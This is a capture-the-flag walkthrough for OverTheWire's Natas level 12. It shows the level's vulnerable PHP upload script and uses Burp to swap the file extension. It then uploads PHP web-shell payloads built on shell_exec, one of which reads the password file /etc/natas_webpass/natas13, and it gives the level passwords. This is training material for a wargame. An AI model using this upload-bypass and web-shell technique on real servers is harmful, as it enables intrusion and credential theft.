# Natas Level 12
The ***URL*** to which you need to connect is *http://natas12.natas.labs.overthewire.org*. The ***username*** is *natas12* and the ***password*** is *EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3*. 

Lets check the [viewsource](http://natas12.natas.labs.overthewire.org/index-source.html) link.
```php
<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}
function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}
if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```
By analysing the php script we can inject some malicious scipts, But we've to use burp to change the extension :
```html
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
```
Lets upload script.php
```php
<? echo shell_exec('pwd'); ?>
# /var/www/natas/natas12/upload
```
```php
# You can use find command to find the password for this level but I expect that they are in the same dir
<? echo shell_exec('cat /etc/natas_webpass/natas13'); ?>
```

![Capture](https://github.com/Reda-BELHAJ/OverTheWire/blob/main/Natas/Captures/Capture5.PNG)

```
The password for natas13 is jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```
